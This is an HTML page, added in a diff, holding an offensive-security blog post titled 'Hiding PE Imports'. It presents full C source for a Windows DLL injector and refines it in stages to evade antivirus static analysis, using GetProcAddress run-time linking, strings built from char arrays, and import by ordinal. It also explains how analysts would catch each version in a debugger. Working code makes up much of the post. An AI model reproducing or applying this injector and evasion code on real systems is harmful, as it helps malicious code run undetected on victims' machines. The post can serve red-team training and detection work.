@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Robleh ">
+<meta name="description" content="You&amp;rsquo;ve spent the last hour cheffing up a spicy, homemade, Windows executable just right for your target. Go to compile it and, sweet, there are no errors. Fire up the isolated VM and give it a few test runs and it&amp;rsquo;s working great. That ASCII art is looking mighty clean I must say. Time to send it downrange. Upload completes and you can see it on the file system.
+PS C:\Users\ksoze&amp;gt; ." />
+<meta name="keywords" content="Red team, hacking, computer science, infosec, cyber security, windows, winapi, pe, c, evasion" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://roblehesa.com/posts/hiding-pe-imports/" />
+
+
+    <title>
+        
+            Hiding PE Imports :: Robleh Esa  — Red Ops
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://roblehesa.com/main.813b296a25669f82585b3c24ff847bd23727f118042e5ec1e526010aedd34426.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://roblehesa.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://roblehesa.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://roblehesa.com/favicon-16x16.png">
+    <link rel="manifest" href="https://roblehesa.com/site.webmanifest">
+    <link rel="mask-icon" href="https://roblehesa.com/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://roblehesa.com/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="Hiding PE Imports">
+<meta itemprop="description" content="You&rsquo;ve spent the last hour cheffing up a spicy, homemade, Windows executable just right for your target. Go to compile it and, sweet, there are no errors. Fire up the isolated VM and give it a few test runs and it&rsquo;s working great. That ASCII art is looking mighty clean I must say. Time to send it downrange. Upload completes and you can see it on the file system.
+PS C:\Users\ksoze&gt; .">
+<meta itemprop="datePublished" content="2020-08-12T17:58:14-05:00" />
+<meta itemprop="dateModified" content="2020-08-12T17:58:14-05:00" />
+<meta itemprop="wordCount" content="1470">
+<meta itemprop="image" content="https://roblehesa.com"/>
+
+
+
+<meta itemprop="keywords" content="windows,winapi,pe,c,evasion," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://roblehesa.com"/>
+
+<meta name="twitter:title" content="Hiding PE Imports"/>
+<meta name="twitter:description" content="You&rsquo;ve spent the last hour cheffing up a spicy, homemade, Windows executable just right for your target. Go to compile it and, sweet, there are no errors. Fire up the isolated VM and give it a few test runs and it&rsquo;s working great. That ASCII art is looking mighty clean I must say. Time to send it downrange. Upload completes and you can see it on the file system.
+PS C:\Users\ksoze&gt; ."/>
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-08-12 17:58:14 -0500 -0500" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://roblehesa.com/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__text">cd ~</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#ff2247;
+                   animation-duration:4s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://roblehesa.com/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>7 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://roblehesa.com/posts/hiding-pe-imports/">Hiding PE Imports</a>
+            </h1>
+                <hr />
+                <aside id="toc">
+                <div class="toc-title">Table of Contents</div>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#import-address-table">Import Address Table</a></li>
+    <li><a href="#run-time-dynamic-linking-with-getprocaddress">Run-Time Dynamic Linking with GetProcAddress</a></li>
+    <li><a href="#bonus-import-by-ordinal">Bonus: Import by Ordinal</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+                </aside>
+                <hr />
+
+            
+
+            <div class="post-content">
+                <p>You&rsquo;ve spent the last hour cheffing up a spicy, homemade, Windows executable just right for your target. Go to compile it and, <em>sweet</em>, there are no errors. Fire up the isolated VM and give it a few test runs and it&rsquo;s working great. That ASCII art is looking mighty clean I must say. Time to send it downrange. Upload completes and you can see it on the file system.</p>
+<p><img src="assets/button.gif" alt="Bombs away!"></p>
+<pre><code class="language-powershell">PS C:\Users\ksoze&gt; ./beastmode.exe
+./beastmode.exe : The term './beastmode.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
+At line:1 char:1
++ ./beastmode.exe
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (./beastmode.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+</code></pre>
+<p>Wait what? It was just&hellip; deleted. &ldquo;But it&rsquo;s custom, no vendor has ever seen this file hash&rdquo;, you tell yourself. Was it sandboxed and analyzed that quickly? Nah, it&rsquo;s got to be something static.</p>
+<p>The executable&rsquo;s Import Address Table may be giving away its intentions before it&rsquo;s run.</p>
+<h2 id="import-address-table">Import Address Table</h2>
+<p>PE files use their Import Address Table to reference functions imported from DLLs. When the PE is executed, the Windows loader maps everything into memory and fills the IAT with the appropriate addresses. Let&rsquo;s take a look at the source code of a sample program and see how it can be improved.</p>
+<pre><code class="language-c">// injector.c injects a DLL into a process
+// If you want to use this, make sure to check return values for errors.
+#include &lt;Windows.h&gt;
+
+int wmain(int argc, PWSTR* argv) {
+	HANDLE process = OpenProcess(
+		PROCESS_ALL_ACCESS,
+		FALSE,
+		_wtoi(argv[1])
+	);
+	PVOID remoteBuffer = VirtualAllocEx(
+		process,
+		NULL,
+		(wcslen(argv[2]) + 1) * sizeof(WCHAR),
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE
+	);
+	WriteProcessMemory(
+		process,
+		remoteBuffer,
+		argv[2],
+		(wcslen(argv[2]) + 1) * sizeof(WCHAR),
+		NULL
+	);
+	PVOID pLoadLibraryW = GetProcAddress(
+		GetModuleHandleW(L&quot;kernel32.dll&quot;),
+		&quot;LoadLibraryW&quot;
+	);
+	CreateRemoteThread(
+		process,
+		NULL,
+		0,
+		(LPTHREAD_START_ROUTINE)pLoadLibraryW,
+		remoteBuffer,
+		0,
+		NULL
+	);
+	return 0;
+}
+</code></pre>
+<p><code>injector.c</code> is a bare-bones DLL injector that:</p>
+<ul>
+<li>Gets a process handle using <code>OpenProcess</code></li>
+<li>Uses <code>VirtualAllocEx</code> to create a writable buffer in the remote process</li>
+<li>Writes the absolute path of a DLL into the remote buffer with <code>WriteProcessMemory</code></li>
+<li>Combines <code>GetModuleHandleW</code> and <code>GetProcAddress</code> to get a pointer to <code>LoadLibraryW</code></li>
+<li>Uses <code>CreateRemoteThread</code> to remotely call <code>LoadLibraryW</code> with the DLL path as an argument</li>
+</ul>
+<p>All in all, that&rsquo;s 7 Windows API functions being referenced from <code>kernel32.dll</code>. Here&rsquo;s the compiled program&rsquo;s IAT viewed in <a href="https://github.com/hasherezade/pe-bear-releases/">PE Bear</a>.</p>
+<p><img src="assets/iat.png" alt="injector.exe&rsquo;s IAT"></p>
+<p>Suspicious combinations of IAT entries can be enough for static analysis to flag a custom PE. In our case, those four at the bottom are a good indicator <code>injector.exe</code> can tamper with other processes. However, you may have noticed <code>LoadLibraryW</code> isn&rsquo;t present in the IAT. That&rsquo;s because <code>GetProcAddress</code> is used to <a href="https://docs.microsoft.com/en-us/windows/win32/dlls/using-run-time-dynamic-linking">link it in at run-time instead of load-time</a>.</p>
+<h2 id="run-time-dynamic-linking-with-getprocaddress">Run-Time Dynamic Linking with GetProcAddress</h2>
+<p>What if we use <code>GetProcAddress</code> for all of our suspicious Windows API function imports? The only hurdle is that <code>GetProcAddress</code> returns generic function pointers (FARPROCs) which can be messy. We can <a href="https://docs.microsoft.com/en-us/cpp/build/getprocaddress?view=vs-2019">use typedefs to provide a little type safety</a> and simplify the calling syntax. You can find the function signatures you need from local header files or <a href="https://docs.microsoft.com/en-us/windows/win32/api/">MSDN</a>.</p>
+<pre><code class="language-c">// injector.c injects a DLL into a process
+// If you want to use this, make sure to check return values for errors.
+#include &lt;Windows.h&gt;
+
+//////////////////////////////////////////////////////////////////////////////
+// typedef the function signature of each dynamic import
+//
+// OpenProcess
+typedef HANDLE (WINAPI* op) (
+    DWORD dwDesiredAccess,
+    BOOL  bInheritHandle,
+    DWORD dwProcessId
+);
+// VirtualAllocEx
+typedef LPVOID (WINAPI* vaex) (
+    HANDLE hProcess,
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flAllocationType,
+    DWORD  flProtect
+);
+// WriteProcessMemory
+typedef BOOL (WINAPI* wpm) (
+    HANDLE  hProcess,
+    LPVOID  lpBaseAddress,
+    LPCVOID lpBuffer,
+    SIZE_T  nSize,
+    SIZE_T* lpNumberOfBytesWritten
+);
+// CreateRemoteThread
+typedef HANDLE (WINAPI* crt) (
+    HANDLE                 hProcess,
+    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+    SIZE_T                 dwStackSize,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID                 lpParameter,
+    DWORD                  dwCreationFlags,
+    LPDWORD                lpThreadId
+);
+//////////////////////////////////////////////////////////////////////////////
+
+int wmain(int argc, PWSTR* argv) {
+    HMODULE kernel32 = GetModuleHandleW(L&quot;kernel32.dll&quot;);
+
+    // Initialize your imported function as one of the types declared above
+    op pOpenProcess = GetProcAddress(kernel32, &quot;OpenProcess&quot;);
+    HANDLE process = pOpenProcess(
+        PROCESS_ALL_ACCESS,
+        FALSE,
+        _wtoi(argv[1])
+    );
+    vaex pVirtualAllocEx = GetProcAddress(kernel32, &quot;VirtualAllocEx&quot;);
+    PVOID remoteBuffer = pVirtualAllocEx(
+        process,
+        NULL,
+        (wcslen(argv[2]) + 1) * sizeof(WCHAR),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    wpm pWriteProcessMemory = GetProcAddress(kernel32, &quot;WriteProcessMemory&quot;);
+    pWriteProcessMemory(
+        process,
+        remoteBuffer,
+        argv[2],
+        (wcslen(argv[2]) + 1) * sizeof(WCHAR),
+        NULL
+    );
+    PVOID pLoadLibraryW = GetProcAddress(
+        GetModuleHandleW(L&quot;kernel32.dll&quot;),
+        &quot;LoadLibraryW&quot;
+    );
+    crt pCreateRemoteThread = GetProcAddress(kernel32, &quot;CreateRemoteThread&quot;);
+    pCreateRemoteThread(
+        process,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)pLoadLibraryW,
+        remoteBuffer,
+        0,
+        NULL
+    );
+    return 0;
+}
+</code></pre>
+<p>With some modifications, all of the functions we need from <code>kernel32.dll</code>, except <code>GetProcAddress</code> and <code>GetModuleHandleW</code>, are loaded dynamically. Let&rsquo;s compile it and see what the IAT looks like.</p>
+<p><img src="assets/stealthier-iat.png" alt="Stealthier IAT"></p>
+<p>Would you look at that? <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code> are no longer present. However, now the string parameters for <code>GetProcAddress</code> are embedded in the binary.</p>
+<p><img src="assets/strings.png" alt="String dump of injector.exe"></p>
+<p>The next step is typically to encrypt or obfuscate the strings until they are passed to <code>GetProcAddress</code>. <a href="https://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/">One trick I&rsquo;ve seen</a> is to use null-terminated arrays of <code>chars</code> instead of strings. This generates assembly instructions that build strings dynamically instead of embedding them intact.</p>
+<pre><code class="language-c">// injector.c injects a DLL into a process
+// If you want to use this, make sure to check return values for errors.
+#include &lt;Windows.h&gt;
+
+// snip...
+
+char kernel32Str[] = {'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0};
+char openProcessStr[] = {'o', 'p', 'e', 'n', 'p', 'r', 'o', 'c', 'e', 's', 's', 0};
+char virtualAllocExStr[] = {'v', 'i', 'r', 't', 'u', 'a', 'l', 'a', 'l', 'l', 'o', 'c', 'e', 'x', 0};
+
+// snip...
+
+int wmain(int argc, PWSTR* argv) {
+    HMODULE kernel32 = GetModuleHandleW(kernel32Str);
+
+    op pOpenProcess = GetProcAddress(kernel32, openProcessStr);
+    HANDLE process = pOpenProcess(
+        PROCESS_ALL_ACCESS,
+        FALSE,
+        _wtoi(argv[1])
+    );
+    vaex pVirtualAllocEx = GetProcAddress(kernel32, virtualAllocExStr);
+    PVOID remoteBuffer = pVirtualAllocEx(
+        process,
+        NULL,
+        (wcslen(argv[2]) + 1) * sizeof(WCHAR),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+// snip...
+</code></pre>
+<p>Our injector is now much more resilient to static analysis techniques. This should be enough to evade detections based on the presence of function names.</p>
+<h2 id="bonus-import-by-ordinal">Bonus: Import by Ordinal</h2>
+<p>With the assistance of a debugger, examining what strings are passed into <code>GetProcAddress</code> is simple. An analyst could set a breakpoint in <code>kernel32.dll</code> on <code>GetProcAddress</code> and examine register states during each call.</p>
+<p><img src="assets/breakpoint.png" alt="Breakpoint on GetProcAddress"></p>
+<p>This would reveal the name of each function being loaded dynamically. Here&rsquo;s an example of what retrieving the address of <code>OpenProcess</code> would look like.</p>
+<p><img src="assets/openprocess.png" alt="GetProcAddress of OpenProcess break"></p>
+<p>However, <code>GetProcAddress</code> doesn&rsquo;t need a function&rsquo;s name. <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress">According to MSDN,</a> it can also look it up by its ordinal:</p>
+<blockquote>
+<p>Parameters</p>
+<p>hModule</p>
+<p>A handle to the DLL module that contains the function or variable. The LoadLibrary, LoadLibraryEx, LoadPackagedLibrary, or GetModuleHandle function returns this handle.</p>
+<p>The GetProcAddress function does not retrieve addresses from modules that were loaded using the LOAD_LIBRARY_AS_DATAFILE flag. For more information, see LoadLibraryEx.</p>
+<p>lpProcName</p>
+<p>The function or variable name, or the function&rsquo;s ordinal value. If this parameter is an ordinal value, it must be in the low-order word; the high-order word must be zero.</p>
+</blockquote>
+<p>An ordinal is the ID number of a function exported by a DLL. We can find the ordinal numbers we need in most PE viewers, I like <a href="https://github.com/hasherezade/pe-bear-releases/">PE Bear</a>. Simply load up <code>kernel32.dll</code>, browse its exports for the function you need, and note its ordinal.</p>
+<p><img src="assets/ordinal.png" alt="PE Bear find ordinal"></p>
+<p>Here&rsquo;s what the final version of <code>injector.c</code> looks like:</p>
+<pre><code class="language-c">// injector.c injects a DLL into a process
+// If you want to use this, make sure to check return values for errors.
+#include &lt;Windows.h&gt;
+
+// OpenProcess
+typedef HANDLE (WINAPI* op) (
+    DWORD dwDesiredAccess,
+    BOOL  bInheritHandle,
+    DWORD dwProcessId
+);
+// VirtualAllocEx
+typedef LPVOID (WINAPI* vaex) (
+    HANDLE hProcess,
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flAllocationType,
+    DWORD  flProtect
+);
+// WriteProcessMemory
+typedef BOOL (WINAPI* wpm) (
+    HANDLE  hProcess,
+    LPVOID  lpBaseAddress,
+    LPCVOID lpBuffer,
+    SIZE_T  nSize,
+    SIZE_T* lpNumberOfBytesWritten
+);
+// CreateRemoteThread
+typedef HANDLE (WINAPI* crt) (
+    HANDLE                 hProcess,
+    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+    SIZE_T                 dwStackSize,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID                 lpParameter,
+    DWORD                  dwCreationFlags,
+    LPDWORD                lpThreadId
+);
+
+int wmain(int argc, PWSTR* argv) {
+    HMODULE kernel32 = GetModuleHandleW(L&quot;kernel32.dll&quot;);
+
+    // Note the hex value instead of a string
+    op pOpenProcess = GetProcAddress(kernel32, 0x411);
+    HANDLE process = pOpenProcess(
+        PROCESS_ALL_ACCESS,
+        FALSE,
+        _wtoi(argv[1])
+    );
+    vaex pVirtualAllocEx = GetProcAddress(kernel32, 0x5D7);
+    PVOID remoteBuffer = pVirtualAllocEx(
+        process,
+        NULL,
+        (wcslen(argv[2]) + 1) * sizeof(WCHAR),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+    wpm pWriteProcessMemory = GetProcAddress(kernel32, 0x62B);
+    pWriteProcessMemory(
+        process,
+        remoteBuffer,
+        argv[2],
+        (wcslen(argv[2]) + 1) * sizeof(WCHAR),
+        NULL
+    );
+    PVOID pLoadLibraryW = GetProcAddress(
+        GetModuleHandleW(L&quot;kernel32.dll&quot;),
+        &quot;LoadLibraryW&quot;
+    );
+    crt pCreateRemoteThread = GetProcAddress(kernel32, 0xE8);
+    pCreateRemoteThread(
+        process,
+        NULL,
+        0,
+        (LPTHREAD_START_ROUTINE)pLoadLibraryW,
+        remoteBuffer,
+        0,
+        NULL
+    );
+    return 0;
+}
+</code></pre>
+<p>Within <a href="https://x64dbg.com/#start">x64dbg</a> if we once again break on <code>GetProcAddress</code>, we will no longer see that obvious function name. The <code>RDX</code> register now contains our function&rsquo;s ordinal, 0x411.</p>
+<p><img src="assets/ordinalbreakpoint.png" alt="Break on GetProcAddress ordinal"></p>
+<p>An analyst would now have to take a few extra steps to find out what function our program is importing. They could trace the ordinal number back to its function name. Or, they could step through the debugger until <code>GetProcAddress</code> returns (CTRL+F9 in <a href="https://x64dbg.com/#start">x64dbg</a>) and examine the return value. The latter is simple since <code>kernel32.dll</code> has debug symbols.</p>
+<p><img src="assets/ordinalreturn.png" alt="GetProcAddress return value"></p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.youtube.com/watch?v=rbN53Xh21_g">Open Security: Life of Binaries</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking">Microsoft: Run-Time Dynamic Linking</a></li>
+<li><a href="https://devblogs.microsoft.com/oldnewthing/20141210-00/?p=43433">Raymond Chen</a></li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://roblehesa.com/tags/windows">windows</a></span><span class="tag"><a href="https://roblehesa.com/tags/winapi">winapi</a></span><span class="tag"><a href="https://roblehesa.com/tags/pe">pe</a></span><span class="tag"><a href="https://roblehesa.com/tags/c">c</a></span><span class="tag"><a href="https://roblehesa.com/tags/evasion">evasion</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1470 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-08-12 22:58 &#43;0000</p>
+        </div>
+
+        
+            <div id="comments" class="thin">
+                <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "robleh" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="https://roblehesa.com">RoblehEsa.com</a></span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></span>
+            <span> <a href="https://roblehesa.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://roblehesa.com/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-166508933-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+    </body>
+</html>
